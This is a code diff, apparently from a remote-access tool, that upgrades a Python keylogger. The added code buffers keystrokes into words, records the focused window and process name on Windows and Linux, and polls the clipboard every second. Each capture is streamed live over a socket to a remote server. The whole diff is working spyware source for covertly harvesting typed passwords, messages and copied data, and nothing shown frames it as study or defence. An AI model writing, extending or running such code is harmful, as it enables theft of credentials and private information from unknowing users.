@@ -518,43 +518,165 @@ _keylog_active = False
 
 
 _last_window_title = ""
+_key_buffer = []
+_keylog_timer = None
+_last_clipboard_content = ""
+_clipboard_monitor_active = False
 
-def get_active_window_title():
+def get_active_window_info():
     import platform
+    title = ""
+    proc_name = ""
     if platform.system() == "Windows":
         try:
             import ctypes
             hwnd = ctypes.windll.user32.GetForegroundWindow()
-            if not hwnd:
-                return ""
-            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
-            buf = ctypes.create_unicode_buffer(length + 1)
-            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
-            return buf.value
+            if hwnd:
+                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+                buf = ctypes.create_unicode_buffer(length + 1)
+                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
+                title = buf.value
+                
+                # Get Process Name
+                pid = ctypes.c_ulong()
+                ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+                if pid.value:
+                    import psutil
+                    proc = psutil.Process(pid.value)
+                    proc_name = proc.name()
         except Exception:
-            return ""
-    return ""
+            pass
+    elif platform.system() == "Linux":
+        try:
+            import subprocess
+            cmd = ["xdotool", "getwindowfocus", "getwindowname"]
+            title = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode().strip()
+            pid_cmd = ["xdotool", "getwindowfocus", "getwindowpid"]
+            pid = subprocess.check_output(pid_cmd, stderr=subprocess.DEVNULL).decode().strip()
+            if pid:
+                import psutil
+                proc = psutil.Process(int(pid))
+                proc_name = proc.name()
+        except Exception:
+            pass
+    return title, proc_name
+
+def read_clipboard_text():
+    import platform
+    if platform.system() == "Windows":
+        try:
+            import ctypes
+            from ctypes import wintypes
+            
+            if not ctypes.windll.user32.OpenClipboard(None):
+                return None
+                
+            h_data = ctypes.windll.user32.GetClipboardData(13) # CF_UNICODETEXT
+            if not h_data:
+                ctypes.windll.user32.CloseClipboard()
+                return None
+                
+            ctypes.windll.kernel32.GlobalLock.argtypes = [wintypes.HANDLE]
+            ctypes.windll.kernel32.GlobalLock.restype = ctypes.c_void_p
+            p_text = ctypes.windll.kernel32.GlobalLock(h_data)
+            
+            text = None
+            if p_text:
+                text = ctypes.wstring_at(p_text)
+                ctypes.windll.kernel32.GlobalUnlock(h_data)
+                
+            ctypes.windll.user32.CloseClipboard()
+            return text
+        except Exception:
+            return None
+    elif platform.system() == "Linux":
+        try:
+            import subprocess
+            return subprocess.check_output(["xclip", "-selection", "clipboard", "-o"], stderr=subprocess.DEVNULL).decode().strip()
+        except Exception:
+            pass
+    return None
+
+def flush_key_buffer():
+    global _key_buffer, client
+    if not _key_buffer:
+        return
+    word = "".join(_key_buffer)
+    _key_buffer = []
+    
+    from datetime import datetime
+    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+    line = f"[KEYSTROKE] {ts} {word}"
+    try:
+        with client_lock:
+            client.send(line.encode("utf-8", errors="replace"))
+            client.send(b"\n")
+    except Exception:
+        pass
+
+def reset_keylog_timer():
+    global _keylog_timer
+    if _keylog_timer is not None:
+        _keylog_timer.cancel()
+    from threading import Timer
+    _keylog_timer = Timer(1.5, flush_key_buffer)
+    _keylog_timer.daemon = True
+    _keylog_timer.start()
+
+def clipboard_monitor_loop():
+    global _last_clipboard_content, _clipboard_monitor_active, client
+    from datetime import datetime
+    
+    _last_clipboard_content = read_clipboard_text() or ""
+    
+    while _clipboard_monitor_active:
+        try:
+            time.sleep(1.0)
+            if not _clipboard_monitor_active:
+                break
+                
+            current_clipboard = read_clipboard_text()
+            if current_clipboard is not None and current_clipboard != _last_clipboard_content:
+                if len(current_clipboard) > 10000:
+                    trimmed = current_clipboard[:10000] + " ... [TRUNCATED]"
+                else:
+                    trimmed = current_clipboard
+                    
+                _last_clipboard_content = current_clipboard
+                ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+                line = f"[CLIPBOARD] {ts} {trimmed}"
+                with client_lock:
+                    client.send(line.encode("utf-8", errors="replace"))
+                    client.send(b"\n")
+        except Exception:
+            pass
 
 def start_keylog_stream():
-    """Start background listener that streams [KEYSTROKE] lines live to server."""
-    global _keylog_listener, _keylog_active, _last_window_title
+    """Start background listener that streams advanced keystroke & clipboard logs."""
+    global _keylog_listener, _keylog_active, _last_window_title, _clipboard_monitor_active, _key_buffer
     _keylog_active = True
+    _clipboard_monitor_active = True
     _last_window_title = ""
+    _key_buffer = []
+    
     from pynput import keyboard
     from datetime import datetime
 
     def on_press(key):
-        global _last_window_title, client
+        global _last_window_title, client, _key_buffer
         if not _keylog_active:
             return False
         try:
             ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
             
             # Check for active window change
-            current_title = get_active_window_title()
-            if current_title and current_title != _last_window_title:
-                _last_window_title = current_title
-                win_line = f"[WINDOW] {ts} {current_title}"
+            current_title, current_proc = get_active_window_info()
+            window_info = f"{current_title} ({current_proc})" if current_proc else current_title
+            
+            if window_info and window_info != _last_window_title:
+                flush_key_buffer()
+                _last_window_title = window_info
+                win_line = f"[WINDOW] {ts} {window_info}"
                 with client_lock:
                     client.send(win_line.encode("utf-8", errors="replace"))
                     client.send(b"\n")
@@ -568,11 +690,8 @@ def start_keylog_stream():
                 try:
                     if hasattr(key, 'vk') and key.vk is not None:
                         vk_mapping = {
-                            # Standard numbers (top row)
                             48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",
-                            # Numpad numbers
                             96: "0", 97: "1", 98: "2", 99: "3", 100: "4", 101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
-                            # Numpad operators
                             106: "*", 107: "+", 109: "-", 110: ".", 111: "/"
                         }
                         if key.vk in vk_mapping:
@@ -581,42 +700,61 @@ def start_keylog_stream():
                     pass
 
             if k is not None:
-                line = f"[KEYSTROKE] {ts} {k}"
+                _key_buffer.append(k)
+                reset_keylog_timer()
             else:
-                s = str(key)
-                if s.startswith("Key."):
-                    line = f"[KEYSTROKE] {ts} <{s.replace('Key.', '').upper()}>"
-                elif s.startswith("<") and s.endswith(">"):
-                    val = s.strip("<>")
-                    if val.isdigit():
-                        vk_val = int(val)
-                        vk_mapping = {
-                            48: "0", 49: "1", 50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7", 56: "8", 57: "9",
-                            96: "0", 97: "1", 98: "2", 99: "3", 100: "4", 101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
-                            106: "*", 107: "+", 109: "-", 110: ".", 111: "/"
-                        }
-                        if vk_val in vk_mapping:
-                            line = f"[KEYSTROKE] {ts} {vk_mapping[vk_val]}"
-                        else:
-                            line = f"[KEYSTROKE] {ts} {s}"
+                from pynput.keyboard import Key
+                if key == Key.space:
+                    _key_buffer.append(" ")
+                    reset_keylog_timer()
+                elif key == Key.backspace:
+                    if _key_buffer:
+                        _key_buffer.pop()
                     else:
-                        line = f"[KEYSTROKE] {ts} {s}"
+                        win_line = f"[KEYSTROKE] {ts} <BACKSPACE>"
+                        with client_lock:
+                            client.send(win_line.encode())
+                            client.send(b"\n")
+                    reset_keylog_timer()
+                elif key in (Key.enter, Key.tab, Key.esc):
+                    flush_key_buffer()
+                    key_str = "Key.enter" if key == Key.enter else ("Key.tab" if key == Key.tab else "Key.esc")
+                    line = f"[KEYSTROKE] {ts} <{key_str.replace('Key.', '').upper()}>"
+                    with client_lock:
+                        client.send(line.encode())
+                        client.send(b"\n")
                 else:
-                    line = f"[KEYSTROKE] {ts} <{s.upper()}>"
-            with client_lock:
-                client.send(line.encode())
-                client.send(b"\n")
+                    flush_key_buffer()
+                    s = str(key)
+                    if s.startswith("Key."):
+                        line = f"[KEYSTROKE] {ts} <{s.replace('Key.', '').upper()}>"
+                    else:
+                        line = f"[KEYSTROKE] {ts} <{s.upper()}>"
+                    with client_lock:
+                        client.send(line.encode())
+                        client.send(b"\n")
         except Exception:
             pass
 
     _keylog_listener = keyboard.Listener(on_press=on_press)
     _keylog_listener.start()
-
+    
+    # Start clipboard monitoring thread
+    import threading
+    threading.Thread(target=clipboard_monitor_loop, daemon=True).start()
 
 def stop_keylog_stream():
-    """Stop the keylog listener and signal end-of-stream."""
-    global _keylog_listener, _keylog_active
+    """Stop the keylog listener, cancel timer, and signal end-of-stream."""
+    global _keylog_listener, _keylog_active, _keylog_timer, _clipboard_monitor_active
     _keylog_active = False
+    _clipboard_monitor_active = False
+    
+    if _keylog_timer is not None:
+        _keylog_timer.cancel()
+        _keylog_timer = None
+        
+    flush_key_buffer()
+    
     if _keylog_listener is not None:
         try:
             _keylog_listener.stop()
